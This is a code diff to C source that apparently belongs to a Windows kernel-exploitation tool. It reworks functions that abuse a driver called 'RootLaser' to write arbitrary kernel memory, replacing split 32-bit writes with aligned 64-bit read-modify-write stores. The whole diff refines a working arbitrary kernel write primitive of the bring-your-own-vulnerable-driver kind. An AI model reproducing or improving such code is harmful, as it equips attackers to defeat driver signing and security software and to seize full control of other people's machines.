@@ -31,7 +31,7 @@
 BOOL RLaserWriteMemoryPrimitive(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
-    _In_ ULONG Value
+    _In_ ULONG64 Value
 )
 {
     RLASER_WRITE_REQUEST request;
@@ -39,7 +39,7 @@ BOOL RLaserWriteMemoryPrimitive(
     RtlSecureZeroMemory(&request, sizeof(request));
     request.MagicNumber = RLASER_MAGIC;
     request.BaseAddress = (DWORD64)Address - RLASER_WRITE_BIAS;
-    request.ValueToWrite = (DWORD64)Value;
+    request.ValueToWrite = Value;
 
     return supCallDriver(
         DeviceHandle,
@@ -110,45 +110,30 @@ BOOL RLaserWriteKernelVirtualMemory(
     _In_ ULONG NumberOfBytes
 )
 {
-    ULONG bytesRemaining = NumberOfBytes;
-    ULONG_PTR currentAddress = Address;
-    BYTE* dataPtr = (BYTE*)Buffer;
-    DWORD64 value;
+    const BYTE* data = (const BYTE*)Buffer;
 
-    while (bytesRemaining > 0) {
+    for (ULONG bytesWritten = 0; bytesWritten < NumberOfBytes;) {
+        ULONG64 value;
+        ULONG_PTR currentAddress = Address + bytesWritten;
+        ULONG offset = (ULONG)(currentAddress & (sizeof(value) - 1));
+        ULONG_PTR wordAddress = currentAddress - offset;
+        ULONG count = min(NumberOfBytes - bytesWritten, (ULONG)sizeof(value) - offset);
 
-        value = 0;
-        if (bytesRemaining >= sizeof(ULONG64)) {
-
-            RtlCopyMemory(&value, dataPtr, sizeof(ULONG64));
-
-            // lower bytes
-            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFF)))
-                return FALSE;
-
-            // high bytes
-            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress + sizeof(ULONG), (ULONG)(value >> 32)))
-                return FALSE;
-
-            bytesRemaining -= sizeof(ULONG64);
-            dataPtr += sizeof(ULONG64);
-            currentAddress += sizeof(ULONG64);
-        }
-        else
+        //
+        // RootLaser stores a full QWORD. Preserve bytes outside a partial write
+        // and use aligned stores so a write never straddles a page boundary.
+        //
+        if (count != sizeof(value) &&
+            !RLaserReadKernelVirtualMemory(DeviceHandle, wordAddress, &value, sizeof(value)))
         {
-            if (!RLaserReadKernelVirtualMemory(DeviceHandle, currentAddress, &value, sizeof(value)))
-                return FALSE;
-
-            RtlCopyMemory(&value, dataPtr, bytesRemaining);
-
-            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFFUL)))
-                return FALSE;
-
-            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress + sizeof(ULONG), (ULONG)(value >> 32)))
-                return FALSE;
-
-            bytesRemaining = 0;
+            return FALSE;
         }
+
+        RtlCopyMemory((BYTE*)&value + offset, data + bytesWritten, count);
+        if (!RLaserWriteMemoryPrimitive(DeviceHandle, wordAddress, value))
+            return FALSE;
+
+        bytesWritten += count;
     }
     return TRUE;
 }
